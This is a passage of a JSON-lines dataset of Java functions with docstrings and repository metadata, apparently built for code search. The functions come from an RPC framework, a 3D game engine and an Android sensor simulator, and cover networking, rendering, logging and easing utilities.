{"docstring": "//\u7f16\u7801\u7c7b\u578b\n", "func_signal": "public CommonRpcTcpServerHandler(int timeout, int port, String token,\n\t\t\tint procotolType, int codecType)", "code": "{\n\t\tsuper();\n\t\tthis.timeout = timeout;\n\t\tthis.port = port;\n\t\tthis.token = token;\n\t\tthis.procotolType = procotolType;\n\t\tthis.codecType = codecType;\n\t}", "path": "commonrpc-tcp\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\tcp\\netty4\\server\\handler\\CommonRpcTcpServerHandler.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.cross.plateform.common.rpc.core.server.RpcServer#stop()\n */\n", "func_signal": "@Override\npublic void stop() throws Exception", "code": "{\n\t// TODO Auto-generated method stub\n\tCommonRpcServerHandlerFactory.getServerHandler().clear();\n\tbossGroup.shutdownGracefully();\n\tworkerGroup.shutdownGracefully();\n\t\n}", "path": "commonrpc-tcp\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\tcp\\netty4\\server\\CommonRpcTcpServer.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/**\n * \u8fde\u63a5\u5b57\u7b26\u4e32\n * \n * @param elements\n *            \u8981\u8fde\u63a5\u7684\u6570\u7ec4\n * @param separator\n *            \u5206\u9694\u7b26\n * @return \u8fde\u63a5\u7ed3\u679c\n */\n", "func_signal": "public static String join(Object[] elements, String separator)", "code": "{\n    if (elements == null) {\n        return EMPTY;\n    }\n    if (separator == null) {\n        separator = EMPTY;\n    }\n\n    StringBuilder sb = new StringBuilder(elements.length * 16);\n\n    for (int i = 0; i < elements.length; i++) {\n        if (i > 0) {\n            sb.append(separator);\n        }\n        sb.append(elements[i]);\n    }\n    return sb.toString();\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\util\\StringUtils.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.jd.cross.plateform.rocketrpc.core.server.handler.RocketRPCServerHandler#handleRequest(com.jd.cross.plateform.rocketrpc.core.wrapper.RocketRPCRequest)\n */\n", "func_signal": "@Override\npublic CommonRpcResponse handleRequest(CommonRpcRequest request,int codecType,int procotolType )", "code": "{\n\t// TODO Auto-generated method stub\n\tCommonRpcResponse responseWrapper = new CommonRpcResponse(request.getId(),codecType,procotolType);\n\tString targetInstanceName = new String(request.getTargetInstanceName());\n\tString methodName = new String(request.getMethodName());\n\tbyte[][] argTypeBytes  = request.getArgTypes();\n\tString[] argTypes = new String[argTypeBytes.length];\n\tfor(int i = 0; i <argTypeBytes.length; i++) {\n\t    argTypes[i] = new String(argTypeBytes[i]);\n\t}\n\tObject[] requestObjects = null;\n\tMethod method = null;\n\ttry{\n\t\tRpcFilterServerBean rpcFilterServerBean = processors.get(targetInstanceName);\n\t\tif(rpcFilterServerBean == null){\n\t\t\tthrow new Exception(\"no \"+targetInstanceName+\" instance exists on the server\");\n\t\t}\n\t\tif (argTypes != null && argTypes.length > 0) {\n\t\t\tStringBuilder methodKeyBuilder = new StringBuilder();\n\t\t\tmethodKeyBuilder.append(targetInstanceName).append(\"#\");\n\t\t\tmethodKeyBuilder.append(methodName).append(\"$\");\n\t\t\tClass<?>[] argTypeClasses = new Class<?>[argTypes.length];\n\t\t\tfor (int i = 0; i < argTypes.length; i++) {\n\t\t\t\tmethodKeyBuilder.append(argTypes[i]).append(\"_\");\n\t\t\t\targTypeClasses[i] = Class.forName(argTypes[i]);\n\t\t\t}\n\t\t\trequestObjects = new Object[argTypes.length];\n\t\t\tmethod = cacheMethods.get(methodKeyBuilder.toString());\n\t\t\tif(method == null){\n\t\t\t\tthrow new Exception(\"no method: \"+methodKeyBuilder.toString()+\" find in \"+targetInstanceName+\" on the server\");\n\t\t\t}\n\t\t\tObject[] tmprequestObjects = request\n\t\t\t\t\t.getRequestObjects();\n\t\t\tfor (int i = 0; i < tmprequestObjects.length; i++) {\n\t\t\t\ttry{\n\t\t\t\t\trequestObjects[i] = CommonRpcCodecs.getDecoder(request.getCodecType()).decode(argTypes[i],(byte[])tmprequestObjects[i]);\n\t\t\t\t}\n\t\t\t\tcatch(Exception e){\n\t\t\t\t\tthrow new Exception(\"decode request object args error\",e);\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\tmethod = rpcFilterServerBean.getObject().getClass().getMethod(methodName,\n\t\t\t\t\tnew Class<?>[] {});\n\t\t\tif(method == null){\n\t\t\t\tthrow new Exception(\"no method: \"+methodName+\" find in \"+targetInstanceName+\" on the server\");\n\t\t\t}\n\t\t\trequestObjects = new Object[] {};\n\t\t}\n\t\tmethod.setAccessible(true);\n\t\tif(rpcFilterServerBean.getRpcFilter()!=null){\n\t\t\tRpcFilter rpcFilter=rpcFilterServerBean.getRpcFilter();\n\t\t\tif(rpcFilter.doBeforeRequest(method, rpcFilterServerBean.getObject(), requestObjects)){\n\t\t\t\tresponseWrapper.setResponse(method.invoke(rpcFilterServerBean.getObject(), requestObjects));\n\t\t\t}else{\n\t\t\t\tresponseWrapper.setException(new Exception(\"\u65e0\u6548\u7684\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u5df2\u7ecf\u62d2\u7edd\u56de\u5e94\"));\n\t\t\t}\n\t\t\trpcFilter.doAfterRequest(responseWrapper.getResponse());\n\t\t}else{\n\t\t\tresponseWrapper.setResponse(method.invoke(rpcFilterServerBean.getObject(), requestObjects));\n\t\t}\n\t\t\n\t}catch(Exception e){\n\t\tLOGGER.error(\"server handle request error\",e);\n\t\tresponseWrapper.setException(e);\n\t}\n\treturn responseWrapper;\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\server\\handler\\impl\\RpcTcpServerHandlerImpl.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "// -------------- Non-VBO rendering --------------\n/*\npublic void render() {\n    \n    bindVBOs();\n    GL.glDrawElements(GL.GL_TRIANGLES, nbIndex, indexType, mIndexBuffer);\n\n}\n\npublic void bindVBOs() {\n    GL.glVertexPointer(3, GL.GL_FLOAT, 0,mVertexBuffer);\n    GL.glTexCoordPointer(2, GL.GL_FLOAT, 0, mTextureBuffer);\n}\n\n\npublic void renderDrawOnly() {\n    GL.glDrawElements(GL.GL_TRIANGLES, nbIndex, indexType, mIndexBuffer);\n}\n*/\n// -----------------------------------------------\n", "func_signal": "public void uploadVBOs()", "code": "{\n    \n    //Vertex\n    if (vertex_VBO != null) {\n        vertex_VBO.createGL();\n        vertex_VBO.upload();\n    }\n    if (texture_VBO != null) {\n        texture_VBO.createGL();\n        texture_VBO.upload();\n    }\n    if (normal_VBO != null) {\n        normal_VBO.createGL();\n        normal_VBO.upload();\n    }\n    if (index_VBO != null) {\n        index_VBO.createGL();\n        index_VBO.upload();\n    }\n    \n    //Could free buffers\n    //mVertexBuffer  = null;\n    //mTextureBuffer = null;\n    //mNormalBuffer = null;\n    //mIndexBuffer   = null;\n\n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\util\\MeshVBOs.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Debug\n", "func_signal": "public static void d(String tag, String msg, Throwable tr)", "code": "{\n    System.out.println(getFinalTag(tag) + \" \" + msg) ;\n    tr.printStackTrace();\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Log.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Some utils\n", "func_signal": "public void init(float x, float y, float z, float w)", "code": "{\n    joins[0].initAt(x);\n    joins[1].initAt(y);\n    joins[2].initAt(z);\n    joins[3].initAt(w);\n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\util\\SmoothJoin.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Returns true if value changed\n", "func_signal": "public boolean update()", "code": "{\n    boolean result = false;\n    for (int i = 0; i < nbComponents; i++) {\n        result |= joins[i].update();\n    }\n    return result;\n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\util\\SmoothJoin.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Workaround for platforms where VBOs are buggy. We fallback to immediate mode. (vertex arrays)\n", "func_signal": "public void bindImmediate(int size, Format format, int stride)", "code": "{\n    if (Platform.renderingAPI == GraphicsAPI.GLES1) {\n        int nativeFormat = 0;\n        switch (format) {\n            case FLOAT:\n                nativeFormat = GL.GL_FLOAT;\n                break;\n            case UNSIGNED_SHORT:\n                nativeFormat = GL.GL_UNSIGNED_SHORT;\n                break;\n            default:\n                Log.e(\"VBO\", \"Format not supported\");\n                break;\n        }\n        if (vboType == Type.POSITION) {\n            GL.glVertexPointer(size, nativeFormat, stride, nativeBuffer);\n        }\n        else if (vboType == Type.TEXTURE) {\n            GL.glTexCoordPointer(size, nativeFormat, stride, nativeBuffer);\n        }\n        else if (vboType == Type.NORMAL) {\n            GL.glNormalPointer(nativeFormat, stride, nativeBuffer);\n        }\n        \n    } else {\n        int nativeFormat = 0;\n        switch (format) {\n            case FLOAT:\n                nativeFormat = GL2.GL_FLOAT;\n                break;\n            case UNSIGNED_SHORT:\n                nativeFormat = GL2.GL_UNSIGNED_SHORT;\n                break;\n            default:\n                Log.e(\"VBO\", \"Format not supported\");\n                break;\n        }\n        \n        if (vboType == Type.POSITION) {\n            GL2.glVertexAttribPointer(ShaderPipeline.currentPipelineBound.attributeLocation.get(ShaderManager.Attribute.position), size, nativeFormat, false, stride, nativeBuffer);\n        }\n        else if (vboType == Type.TEXTURE) {\n            GL2.glVertexAttribPointer(ShaderPipeline.currentPipelineBound.attributeLocation.get(ShaderManager.Attribute.texture), size, nativeFormat, false, stride, nativeBuffer);\n        }\n        else if (vboType == Type.NORMAL) {\n            if (ShaderPipeline.currentPipelineBound.hasAttribute(ShaderManager.Attribute.normal)) {\n                GL2.glVertexAttribPointer(ShaderPipeline.currentPipelineBound.attributeLocation.get(ShaderManager.Attribute.normal), size, nativeFormat, false, stride, nativeBuffer);    \n            }\n        }\n    }\n    \n}", "path": "Exp3D\\src\\com\\breakingbyte\\wrap\\shared\\VBO.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "/**\n * Get the raw path of a file within the android project\n * @param id some integer within R.java\n * @return the raw HDD path of the file\n */\n", "func_signal": "public static String getFilePathFromID(int id)", "code": "{\n    \n    String ROOT_FOLDER = DesktopApplication.ANDROID_ROOT;\n    if (!ROOT_FOLDER.endsWith(\"/\")) ROOT_FOLDER += \"/\";\n    ROOT_FOLDER += \"res/\";\n    \n    try {\n        \n        String fullPartialPath = ROOT_FOLDER + getPartialFilePath(id);\n        \n        String rootFolder = discardAfterLast(fullPartialPath, '/');\n        String partialFileName = discardBeforeLast(fullPartialPath, '/');\n        \n        String fullFileName = findFullNameFromPartialName(rootFolder, partialFileName);\n        \n        return rootFolder + \"/\" + fullFileName;\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    \n    Log.e(TAG, \"No resource found for id: \" + id + \"!\");\n    return \"\";\n\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Resource.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Info\n", "func_signal": "public static void i(String tag, String msg, Throwable tr)", "code": "{\n\tSystem.out.println(getFinalTag(tag) + \" \" + msg) ;\n\ttr.printStackTrace();\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Log.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "// These 3 methods can be called only in VBO mode (Renderer.switchToVBOMode();)\n", "func_signal": "public void bindVBOs()", "code": "{\n    \n    if (!Debug.noVBO) {\n        //Bind vertex\n        vertex_VBO.bindWithFormat(3, Format.FLOAT, 0, 0);\n        \n        //Bind texture coordinates\n        texture_VBO.bindWithFormat(2, Format.FLOAT, 0, 0);\n        \n        if (normal_VBO != null){\n            normal_VBO.bindWithFormat(3, Format.FLOAT, 0, 0);\n        }\n        \n        //Bind indexes\n        index_VBO.bindAsIndex();\n    } else {\n        //Bind vertex\n        vertex_VBO.bindImmediate(3, Format.FLOAT, 0);\n        \n        //Bind texture coordinates\n        texture_VBO.bindImmediate(2, Format.FLOAT, 0);\n        \n        if (normal_VBO != null){\n            normal_VBO.bindImmediate(3, Format.FLOAT, 0);\n        }\n        \n        //Bind indexes\n        //index_VBO.bindAsIndex();\n    }\n           \n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\util\\MeshVBOs.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "// \"a.b.c.d\" -> \"a.b.c\"\n", "func_signal": "public static String discardAfterLast(String s, char delimiter) throws Exception", "code": "{\n    int lastDot = s.lastIndexOf(delimiter);\n    if (lastDot==-1){ \n       throw new Exception(\"No delimiter '\" + delimiter +\"' in the string \\\"\" + s +\"\\\"!\");\n    }\n    return s.substring (0, lastDot);\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Resource.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "/**\n * Finds a filepath in the res folder given an ID. (File extension missing)\n * Example: for (int)R.drawable.someId we get \"drawable/someId\"\n * @param toFindId an integer value corresponding to an attribute in R.java\n * @return the relative path in the res folder, without file extension (\"drawable/someId\")\n * @throws IllegalAccessException \n * @throws Exception \n */\n", "func_signal": "@SuppressWarnings(\"rawtypes\")\nprivate static String getPartialFilePath(int toFindId) throws Exception", "code": "{\n\n    //Some Java reflection goodness\n    \n    //Get package name\n    String fullyQualifiedName = Resource.class.getName();\n    String packageName = discardAfterLast(fullyQualifiedName, '.');\n\n    //Get full name of R.java\n    String androidRClass = packageName + \".R\";\n\n    Class c = Class.forName(androidRClass);\n    \n    //Get all sub-classes (\"drawable\", \"raw\", ...)\n    Class[] innerClasses = c.getDeclaredClasses();\n    for (Class innerClass : innerClasses){\n        \n        //Get attributes\n        Field[] fields = innerClass.getDeclaredFields();\n        for (Field field : fields) {\n\n            int value = field.getInt(null);\n            \n            if (value == toFindId) {\n                //We found it!\n                String filePath = innerClass.getSimpleName()+\"/\"+field.getName();\n                return filePath;\n            }                    \n        }\n    }            \n\n    throw new Exception(\"Could not find \" + toFindId + \" in R.java!\");\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Resource.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Load perspective projection\n", "func_signal": "public static final void loadPerspective(float nearPlane, float farPlane)", "code": "{\n    if (Platform.renderingAPI == GraphicsAPI.GLES1) {\n        GL.glMatrixMode(GL.GL_PROJECTION);\n        GL.glLoadIdentity();\n        //Perspective\n        GLU.gluPerspective(45.0f, (float)Screen.VIEWPORT_WIDTH / (float)Screen.VIEWPORT_HEIGHT, nearPlane, farPlane);\n        GL.glMatrixMode(GL.GL_MODELVIEW);\n        GL.glLoadIdentity();       \n    } else {\n        projectionMtx.setToProjection(nearPlane, farPlane, 45.0f, (float)Screen.VIEWPORT_WIDTH / (float)Screen.VIEWPORT_HEIGHT);\n        matrixStack.getCurrent().idt();\n    }\n}", "path": "Exp3D\\src\\com\\breakingbyte\\wrap\\shared\\Renderer.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//    @Override\n//    public void update() {\n//        super.update();\n//        setFocusColor(110f / 255f, 219f / 255f, 255.0f / 255f);\n//    }\n", "func_signal": "public void layoutChildren(float width, float height)", "code": "{\n        super.layoutChildren(width, height);\n        chapterNumber.setPosition(-width * 0.5f + 7f, height * 0.5f -4.6f);\n        chapterName.setPosition(-width * 0.5f + 6f, 2.7f);\n        \n        progress.setPosX(width * 0.5f  - progress.getWidth() - 4f);\n    }", "path": "Exp3D\\src\\com\\breakingbyte\\game\\ui\\dialog\\ChapterButton.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Warning\n", "func_signal": "public static void w(String tag, String msg, Throwable tr)", "code": "{\n\tSystem.err.println(getFinalTag(tag) + \" \" + msg) ;\n\ttr.printStackTrace();\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Log.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "/**\n * Loads all the textures.\n */\n", "func_signal": "public static boolean loadTextures(int level)", "code": "{\n\t\n    if (ui_digit == null && level > ResourceLevel.BOOTLOADER) {\n        //Special case: is runtime-generated on Android only\n        ui_digit = TextTexture.generate(TextTexture.TextId.DIGITS);\n        allTextures.add(ui_digit);\n    }\n    \n    Renderer.enableTexture();\n        //gl.glTexEnvf(GL.GL_TEXTURE_ENV, GL.GL_TEXTURE_ENV_MODE, GL.GL_REPLACE);\n\t\n    boolean allLoaded = true;\n    \n    for (int i = 0; i < allTextures.size(); i++) {\n        Texture tex = allTextures.get(i);\n        if (tex.level <= level && !tex.isLoaded) {\n            tex.load();\n            allLoaded = false;\n        }\n    }\n        \n        return allLoaded;\n        //ui_boss_warning = TextTexture.generate(TextTexture.TextId.BOSS_WARNING);\n        //ui_level_title_1 = TextTexture.generate(TextTexture.TextId.LEVEL_TITLE_1);\n        //ui_level_title_2 = TextTexture.generate(TextTexture.TextId.LEVEL_TITLE_2);\n        //ui_ship_focuser = TextTexture.generate(TextTexture.TextId.SHIP_FOCUSER);\n        \n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\render\\TextureManager.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Error\n", "func_signal": "public static void e(String tag, String msg, Throwable tr)", "code": "{\n\tSystem.err.println(getFinalTag(tag) + \" \" + msg) ;\n\ttr.printStackTrace();\n}", "path": "Exp3DDesktop\\src\\com\\breakingbyte\\wrap\\Log.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Load orthonormal projection\n", "func_signal": "public static final void loadOrtho()", "code": "{\n    if (Platform.renderingAPI == GraphicsAPI.GLES1) {\n        /*\n        GL.glMatrixMode(GL.GL_PROJECTION);\n        GL.glLoadIdentity();\n        //Orthogonal\n        GL.glOrthof(0.0f, Screen.ARENA_WIDTH, 0.0f, Screen.ARENA_HEIGHT, 100.0f, -100.0f);\n        GL.glMatrixMode(GL.GL_MODELVIEW);\n        GL.glLoadIdentity();\n        */    \n    } else {\n        projectionMtx.setToOrtho2D(0, 0, Screen.ARENA_WIDTH, Screen.ARENA_HEIGHT, 100.0f, -100.0f);\n        matrixStack.getCurrent().idt();\n    }\n}", "path": "Exp3DGWT\\src\\com\\breakingbyte\\wrap\\shared\\Renderer.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Music\n", "func_signal": "public void registerMusic(SoundDescriptor musicDesc)", "code": "{\n    SoundEffectImpl result = (SoundEffectImpl)generateSoundEffect(musicDesc.id, musicDesc.path);\n    musics.put(musicDesc.id, result);\n}", "path": "Exp3DGWT\\src\\com\\breakingbyte\\wrap\\Audio.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "//Load orthogonal projection\n", "func_signal": "public static final void loadOrtho()", "code": "{\n    if (Platform.renderingAPI == GraphicsAPI.GLES1) {\n        GL.glMatrixMode(GL.GL_PROJECTION);\n        GL.glLoadIdentity();\n        //Orthogonal\n        GL.glOrthof(0.0f, Screen.ARENA_WIDTH, 0.0f, Screen.ARENA_HEIGHT, 100.0f, -100.0f);\n        GL.glMatrixMode(GL.GL_MODELVIEW);\n        GL.glLoadIdentity();    \n    } else {\n        projectionMtx.setToOrtho2D(0, 0, Screen.ARENA_WIDTH, Screen.ARENA_HEIGHT, 100.0f, -100.0f);\n        matrixStack.getCurrent().idt();\n    }\n}", "path": "Exp3D\\src\\com\\breakingbyte\\wrap\\shared\\Renderer.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "/**\n * Returns a normalized progress-value calculated form the time elapsed.\n * Some equations based on the Java-universal-tween-engine library, \n * itself based on Robert Penner's work http://robertpenner.com/easing/\n * @return the progress value\n */\n", "func_signal": "@SuppressWarnings(\"incomplete-switch\")\nprivate float getEquationProgress(Interpolator interpolator, float progress)", "code": "{\n    \n    float s;\n    \n    switch (interpolator) {\n        \n        case LINEAR_TIMED:\n            return progress;\n        \n        case SINUSOIDAL:\n            return (float)Math.sin(progress * MathUtil.HALF_PI);\n            \n        case SINUSOIDAL_SLOW_START:\n            return 0.5f * (1 + (float)Math.sin( (progress * MathUtil.PI ) - MathUtil.HALF_PI) );\n        \n        case QUADRATIC_START:\n            return progress * progress;\n            \n        case QUADRATIC_END:\n            return -progress * (progress - 2);\n            \n        case QUADRATIC_START_END:\n            if ( (progress *= 2) < 1) return 0.5f * progress * progress;\n            return -0.5f * ((--progress) * (progress - 2) - 1);\n        \n        case BACK_START:\n            s = parent.backAmplitude;\n            return progress * progress * ((s+1)*progress - s);\n            \n        case BACK_END:\n            s = parent.backAmplitude;\n            return (progress-=1) * progress * ((s+1)*progress + s) + 1;\n \n        case BACK_START_END:\n            s = parent.backAmplitude;\n            if ((progress*=2) < 1) return 0.5f*(progress*progress*(((s*=(1.525f))+1)*progress - s));\n            return 0.5f*((progress-=2)*progress*(((s*=(1.525f))+1)*progress + s) + 2);\n            \n        case BOUNCE:\n            if (progress < (1 / 2.75f)) {\n                    return 7.5625f * progress * progress;\n            } else if (progress < (2 / 2.75f)) {\n                    return 7.5625f * (progress -= (1.5f/2.75f)) * progress + 0.75f;\n            } else if (progress < (2.5f / 2.75f)) {\n                    return 7.5625f * (progress -= (2.25f/2.75f)) * progress + 0.9375f;\n            } else {\n                    return 7.5625f * (progress -= (2.625f/2.75f)) * progress + 0.984375f;\n            }\n            \n        case ELASTIC:\n            /*\n            float t = progress;\n            if (t == 0) return 0; \n            if (t == 1) return 1; \n            if (!parent.elasticDampingSet) parent.elasticDamping = 0.3f;\n            float s;\n            if (!parent.elasticAmplitudeSet || parent.elasticAmplitude < 1) { \n                parent.elasticAmplitude = 1;\n                s = parent.elasticDamping / 4; \n            } else {\n                s = parent.elasticDamping / (MathUtil.TWO_PI) * (float)Math.asin( 1 / parent.elasticAmplitude);\n            }\n            return parent.elasticAmplitude * (float)Math.pow(2,-10*t) * (float)Math.sin( (t-s)*(MathUtil.TWO_PI) / parent.elasticDamping ) + 1;\n            */\n            float t = progress;\n            if (t == 0) return 0; \n            if (t == 1) return 1; \n            if ( parent.elasticAmplitude <= 1 ) { \n                parent.elasticAmplitude = 1;\n                s = parent.elasticDamping / 4; \n            } else {\n                s = parent.elasticDamping / (MathUtil.TWO_PI) * (float)Math.asin( 1 / parent.elasticAmplitude);\n            }\n            return parent.elasticAmplitude * (float)Math.pow(2,-14*t) * (float)Math.sin( (t-s)*(MathUtil.TWO_PI) / parent.elasticDamping ) + 1;\n            \n\n    }\n    \n    return 0f;\n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\util\\SmoothJoin.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "/*\nprotected boolean elasticAmplitudeSet = false;\n\npublic void setElasticAmplitude(float value) {\n    elasticAmplitude = value;\n    elasticAmplitudeSet = true;\n}\n\nprotected boolean elasticDampingSet = false;\n\npublic void setElasticDamping(float value) {\n    elasticDamping = value;\n    elasticDampingSet = true;\n}\n*/\n", "func_signal": "public void setElasticValues(float amplitude, float damping)", "code": "{\n    elasticAmplitude = amplitude;\n    elasticDamping = damping;\n}", "path": "Exp3D\\src\\com\\breakingbyte\\game\\util\\SmoothJoin.java", "repo_name": "acourreges/exp3d", "stars": 88, "license": "other", "language": "java", "size": 42408}
{"docstring": "/**\n * Unregisters a listener for the sensors with which it is registered.\n * \n * @param listener\n *            a SensorListener object\n */\n", "func_signal": "public void unregisterListener(SensorEventListener listener)", "code": "{\n\tif (mClient.connected) {\n\t\tmClient.unregisterListener(listener);\n\t}\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "// remove/add operations\n", "func_signal": "public void remove(StateModel model)", "code": "{\n\tmStates.remove(model);\n\tsetStopState(mStates.size() - 1);\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\model\\SensorsScenarioModel.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * When we register Sensor we use\n * SensorManager.getDefaultSensor(SENSOR.TYPE). This method simulates that\n * command. If it's first time we are registering new sensor, new sensor\n * object is created. Otherwise we check if sensor is already registered. If\n * it's not, we add it to our Sensor object so that it can be registered. If\n * it's already registered, than this method was called in\n * unregisterListener method and we add that sensor to our Sensor object to\n * be unregistered.\n * \n * @param type\n *            , integer number of sensor to be registered or unregistered.\n * @return sensors, Sensor object that is used in our methods.\n */\n", "func_signal": "public Sensor getDefaultSensor(int type)", "code": "{\n\tif (sensors == null) {\n\t\tsensors = new Sensor(mContext, type);\n\t\treturn sensors;\n\t} else if (sensors.checkList(type)) {\n\t\tsensors.addSensor(type);\n\t\treturn sensors;\n\t} else {\n\t\tsensors.removeSensor(type);\n\t\treturn sensors;\n\t}\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * It is called from SensorSimulatorController on each update loop if\n * the sensor simulator state need to be taken from the scenario (not \n * computed from sensor parameters from sensor simulator GUI).\n * \n * @param state PLAY, RECORD, PAUSE, STOP\n */\n", "func_signal": "public void doTime(int state)", "code": "{\n\tswitch (state) {\n\tcase SensorSimulatorController.PLAY: {\n\t\tfloat limitMainStates = mSavingTimeInterval * Global.MS_IN_SECOND;\n\t\tfloat limitInterpolatedStates = mInterpolationTimeInterval\n\t\t\t\t* Global.MS_IN_SECOND;\n\t\tfloat passedScenarioTime = System.currentTimeMillis()\n\t\t\t\t- mScenarioTime;\n\t\tfloat passedInterpolatedTime = System.currentTimeMillis()\n\t\t\t\t- mScenarioInterpolatedTime;\n\t\t// check first if we should go to the next main state\n\t\tif (passedScenarioTime > limitMainStates) {\n\t\t\t// get next main state\n\t\t\tint crtPosition = mModel.getCurrentPosition();\n\t\t\tStateModel crtState = mModel.getState(crtPosition);\n\t\t\tif (crtState != null) {\n\t\t\t\t// load the next state in the model\n\t\t\t\tmSensorSimulatorController.loadStateIntoTheModel(crtState,\n\t\t\t\t\t\tcrtPosition);\n\t\t\t\tmView.refresh();\n\t\t\t}\n\n\t\t\t// check if we should stop\n\t\t\tif (crtPosition == mModel.getStopPosition()) {\n\t\t\t\tif (!isLooping()) {\n\t\t\t\t\tmSensorSimulatorController\n\t\t\t\t\t\t\t.switchState(SensorSimulatorController.NORMAL);\n\t\t\t\t\tbreak;\n\t\t\t\t} else {\n\t\t\t\t\tcrtPosition = mModel.getStartPosition();\n\t\t\t\t\tsetCurrentPosition(crtPosition);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// there are more states => generate interpolated states\n\t\t\t\tStateModel nextState = mModel.getState(crtPosition + 1);\n\t\t\t\tmInterpolatedStates = Interpolate.getIntermediateStates(\n\t\t\t\t\t\tcrtState, nextState, mNumberOfIntermediarStates);\n\t\t\t\tmCrtInterpolationPosition = 0;\n\t\t\t\tsetCurrentPosition(crtPosition + 1);\n\t\t\t}\n\n\t\t\t// update time\n\t\t\tmScenarioTime = System.currentTimeMillis();\n\t\t} else if (passedInterpolatedTime > limitInterpolatedStates\n\t\t\t\t&& mCrtInterpolationPosition < mInterpolatedStates.size()) {\n\t\t\t// if we should go to the next secondary state\n\t\t\tStateModel interpolatedState = mInterpolatedStates\n\t\t\t\t\t.get(mCrtInterpolationPosition);\n\t\t\tmSensorSimulatorController\n\t\t\t\t\t.loadStateIntoTheModel(interpolatedState);\n\n\t\t\tmScenarioInterpolatedTime = System.currentTimeMillis();\n\t\t\tmCrtInterpolationPosition++;\n\t\t}\n\t}\n\t\tbreak;\n\tcase SensorSimulatorController.STOP: {\n\t\tsetCurrentPosition(mModel.getStartPosition());\n\t\tmSensorSimulatorController\n\t\t\t\t.switchState(SensorSimulatorController.NORMAL);\n\t\tmView.refresh();\n\t}\n\t\tbreak;\n\tcase SensorSimulatorController.PAUSE: {\n\t\t// mScenarioTime = System.currentTimeMillis();\n\t}\n\t\tbreak;\n\tcase SensorSimulatorController.RECORD: {\n\t\t// if it is time for the next state from recording\n\t\tif (mSavingTimeInterval * Global.MS_IN_SECOND < (System\n\t\t\t\t.currentTimeMillis() - mScenarioTime)) {\n\t\t\t// enable recorded sensors in the simulator\n\t\t\t// (if they aren't yet)\n\t\t\tenableSensors(mRecordedSensors);\n\t\t\t// get next state\n\t\t\tStateModel nextState = StateModel\n\t\t\t\t\t.getStateFromRecordedSensors(mRecordedSensors);\n\t\t\tif (nextState != null) {\n\t\t\t\t// load the next state in the model\n\t\t\t\tmSensorSimulatorController.loadStateIntoTheModel(nextState);\n\n\t\t\t\t// add the 